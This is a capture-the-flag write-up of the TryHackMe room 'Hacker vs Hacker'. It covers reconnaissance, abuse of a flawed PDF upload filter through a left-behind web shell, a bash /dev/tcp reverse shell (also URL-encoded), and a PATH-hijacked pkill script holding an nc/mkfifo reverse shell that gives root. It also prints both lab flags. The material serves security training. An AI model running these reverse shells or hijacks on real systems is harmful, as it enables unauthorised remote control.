---
title: "TryHackMe - Hacker vs Hacker"
date: 2025-04-03 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [ssh, gobuster, rce, reverse shell, cron, dirsearch, url encode ]

---
## Reconnaissance
The first step in any reconnaissance process is to run an **Nmap** scan to gather information about the target system. I used the following command:

```console
$ nmap -sC -sV -A 10.10.55.153    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-03 08:15 EDT
Nmap scan report for 10.10.55.153
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Directory Enumeration
Next, I scan the directories using **gobuster**

```
gobuster dir -u http://10.10.55.153 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.153
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.55.153/css/]
/cvs                  (Status: 301) [Size: 310] [--> http://10.10.55.153/cvs/]
/dist                 (Status: 301) [Size: 311] [--> http://10.10.55.153/dist/]
/images               (Status: 301) [Size: 313] [--> http://10.10.55.153/images/]
/index.html           (Status: 200) [Size: 3413]
/server-status        (Status: 403) [Size: 277]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished

```

I also check the source of the script that allows submitting the CV  <Br>(view-source:http://10.10.55.153/upload.php)</br>
```

Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->

```


This code contains incorrect file extension validation **strpos()** does not guarantee that .pdf is at the end of the filename. It could be anywhere (e.g., evil.pdf.exe).
```
if (!strpos($target_file, ".pdf")) {
```
If .pdf is not found at all, **strpos()** returns false, but for a file named resume.pdf.exe, the condition will still pass.


Knowing that the website has already been hacked, and understanding the script error that could allow the submission of a shell, I begin searching for such an opportunity since the site has already been compromised.

```console
$ gobuster dir --no-error -u 10.10.55.153/cvs -t64 -w /usr/share/dirb/wordlists/common.txt -x .pdf.php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.153/cvs
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.pdf.php         (Status: 403) [Size: 277]
/.htaccess.pdf.php    (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.pdf.php    (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 26]
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================
```


I see an interesting **PHP script** here that catches my attention
```
/shell.pdf.php        (Status: 200) [Size: 18]
```

I navigate to the script's address and only see a message left by the hacker

```
boom!
```

Next, I begin searching for hidden resources using **dirsearch**

```
dirsearch -u 10.10.55.153/cvs/shell.pdf.php
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                            
 (_||| _) (/_(_|| (_| )                                                                                     
                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/_10.10.55.153/_cvs_shell.pdf.php_25-04-03_09-14-29.txt

Target: http://10.10.55.153/

[09:14:29] Starting: cvs/shell.pdf.php/                                                                     
[09:14:30] 404 -  274B  - /cvs/shell.pdf.php/%2e%2e//google.com             
[09:15:06] 200 -   44B  - /cvs/shell.pdf.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
                                                                             
Task Completed                                                                               
```
A 200 response with such a path and parameters may suggest that the server is vulnerable to certain types of attacks, such as **Remote Code Execution (RCE)** or other attacks related to improper handling of URL parameters. The **cmd=dir** parameter could be an attempt to execute a system command on the server, which presents a potential attack vector.
I try to craft a link to check if command execution works here.

```
http://10.10.55.153/cvs/shell.pdf.php?cmd=whoami
```

It works 

## Privilege Escalation
```
www-data

boom!
```

Now, I can proceed to create my own reverse shell. I use a [reverse shell generator](https://www.revshells.com) and create the following shell:
```
bash -c 'bash -i >& /dev/tcp/10.8.21.77/8888 0>&1'
```

The shell doesn't execute as expected, so I use a [URL encoder](hackerrank.com) and convert the above shell into:

```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.21.77%2F8888%200%3E%261%27
```

Now everything works. I proceed to search through the directories. In /home/lachlan, I find the first flag.

**FLAG : thm{af7e46b68081d4025c5ce10851430617}**

##  Root  access

I proceed to search for traces left by the previous hacker by checking .bash_history

```
www-data@b2r:/home/lachlan$ cat .bash_history
cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history

```
I see that the password for the user, probably **lachlan**, has been changed, the same user where I found the first flag. I attempt to connect to the **lachlan** account via SSH using the previously mentioned password.

```console
$ ssh lachlan@10.10.55.153
lachlan@10.10.55.153's password: 
Permission denied, please try again.
lachlan@10.10.55.153's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 03 Apr 2025 01:40:44 PM UTC

  System load:  0.13              Processes:             125
  Usage of /:   25.8% of 9.78GB   Users logged in:       0
  Memory usage: 44%               IPv4 address for eth0: 10.10.55.153
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
$ nope
Connection to 10.10.55.153 closed.
```

After some time, the connection is closed. I noticed earlier that the hacker also modified **cron.d/persistence**. I open the file and find:

```console
www-data@b2r:/home/lachlan$ cat /etc/cron.d/persistence
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

It is a malicious code left as a kill switch for user sessions. Every minute, the root user closes all terminal sessions, and it runs every 10 seconds due to the sleep command delaying its execution. In practice, this means that any user logging in via SSH is immediately kicked out.

Fortunately, lachlan has root privileges to the /bin folder, which I can leverage.

```console
www-data@b2r:/home/lachlan$ ls -la
ls -la
total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
```
I prepare a sequence of commands that I quickly paste into the terminal in a short window immediately after logging in via SSH to the lachlan account.

```console
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.x.x 4444 >/tmp/f" > /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill
```

Earlier, I opened a listening port 4444 on my machine.

```console
> nc lvnp 4444
```
This creates a malicious script called pkill in the **/home/lachlan/bin/** directory. When executed, the script first deletes any existing file at **/tmp/f** to prevent conflicts. Then, it creates a FIFO (named pipe) at **/tmp/f**, which allows data to flow between processes. The script then redirects the data from this pipe to an interactive shell (/bin/sh -i), enabling command execution on the victim’s machine as if it were a local terminal session.

Instead of displaying the output on the screen, the script sends it to **netcat** (nc), which opens a connection to the attacker's machine at IP 10.8.x.x on port 4444. This is the reverse shell, granting remote control of the victim's system. Finally, the script sends the shell’s responses back to the FIFO, keeping the communication open, allowing ongoing interaction with the system remotely.

Now, I can retrieve the root flag.

```console
# cat root.txt
thm{7b708e5224f666d3562647816ee2a1d4}
# 
```

**Flag : thm{7b708e5224f666d3562647816ee2a1d4}**